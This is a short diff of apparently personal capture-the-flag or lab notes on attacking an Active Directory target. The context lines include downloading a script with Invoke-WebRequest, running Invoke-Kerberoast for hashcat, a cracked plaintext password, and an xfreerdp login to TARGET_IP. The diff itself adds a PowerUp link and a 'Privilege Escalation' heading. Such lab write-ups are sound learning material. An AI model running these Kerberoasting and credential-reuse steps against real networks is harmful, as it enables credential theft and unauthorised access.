@@ -82,6 +82,7 @@ Invoke-WebRequest -URI $URL -OutFile $Path
  . .\Invoke-Kerberoast.ps1
 Invoke-Kerberoast -OutputFormat hashcat|fl
 
+https://rootrecipe.medium.com/advanced-powerup-ps1-usage-ad0f6d713a9f
 
 
 TicketByteHexStream  :
@@ -115,3 +116,9 @@ got the password: rubenF124
 
 xfreerdp /v:TARGET_IP /u:fela /p:rubenF124
 from desktop got the flag
+
+
+TASK 4
+------
+Privilege Escalation
+
